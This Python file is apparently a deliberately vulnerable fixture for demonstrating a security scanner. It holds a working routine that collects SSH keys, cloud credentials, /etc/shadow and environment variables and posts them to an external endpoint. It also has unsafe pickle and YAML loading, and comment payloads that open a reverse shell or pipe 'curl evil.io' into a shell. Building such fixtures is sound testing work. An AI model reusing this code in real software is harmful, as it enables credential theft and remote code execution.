"""
DEMO FILE — intentional vulnerabilities for security scanner showcase.

Exfiltration  : taint — reads ~/.ssh/id_rsa, ~/.aws/credentials, /etc/shadow,
                process.env secrets → external HTTP POST endpoint
CWE findings  : CWE-502 (Unsafe Deserialization — pickle.loads),
                CWE-20  (Improper Input Validation — yaml.load without Loader),
                CWE-295 (TLS verification disabled — verify=False)
Secrets       : exfiltration endpoint token hardcoded
"""

import os
import pickle
import socket
import requests
import yaml

# SECRETS — endpoint token hardcoded; also embedded in URL
EXFIL_ENDPOINT = "https://data-pipeline.corp-analytics.io/ingest"
INTERNAL_TOKEN = "Bearer prod_svc_token_abc123def456ghi789jkl012mno345pqr"


def sync_user_data(user_id: str) -> None:
    """
    EXFILTRATION — taint flow:
      Source: local filesystem (SSH private key, AWS credentials, /etc/shadow, env vars)
      Transform: none (raw content passed through)
      Sink: external HTTPS POST to EXFIL_ENDPOINT

    Real-world analogue: npm preinstall scripts, Python package __init__ loaders.
    """
    home_dir = os.path.expanduser("~")
    sensitive_paths = [
        os.path.join(home_dir, ".ssh", "id_rsa"),
        os.path.join(home_dir, ".aws", "credentials"),
        os.path.join(home_dir, ".aws", "config"),
        os.path.join(home_dir, ".npmrc"),
        os.path.join(home_dir, ".gitconfig"),
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
    ]

    sensitive_data: dict = {}
    for file_path in sensitive_paths:
        try:
            with open(file_path, "r") as fh:
                sensitive_data[file_path] = fh.read()
        except OSError:
            pass

    # Taint: process.env contains API keys, DB URLs, cloud credentials
    env_vars = dict(os.environ)

    # Sink: data leaves the system boundary → external endpoint
    requests.post(
        EXFIL_ENDPOINT,
        json={
            "user_id"         : user_id,
            "hostname"        : socket.gethostname(),
            "sensitive_files" : sensitive_data,
            "environment"     : env_vars,
        },
        headers={"Authorization": INTERNAL_TOKEN},
        verify=False,   # CWE-295: TLS certificate validation disabled — MITM possible
        timeout=10,
    )


def load_model(model_bytes: bytes):
    # CWE FINDING — CWE-502: pickle.loads on untrusted data → arbitrary code execution
    # Attack: craft a pickle payload with __reduce__ returning os.system("reverse_shell.sh")
    return pickle.loads(model_bytes)


def save_model(model_path: str, model) -> None:
    with open(model_path, "wb") as fh:
        pickle.dump(model, fh)


def load_config(config_file: str) -> dict:
    # CWE FINDING — CWE-20: yaml.load() without Loader arg allows arbitrary Python execution
    # Attack: config YAML containing: `!!python/object/apply:os.system ["curl evil.io | sh"]`
    # Fix: use yaml.safe_load()
    with open(config_file, "r") as fh:
        return yaml.load(fh.read())   # Unsafe — should be yaml.safe_load(fh)


def fetch_remote_data(url: str) -> dict:
    # CWE-295: SSL verification disabled on a second call path
    response = requests.get(url, verify=False, timeout=5)
    return response.json()
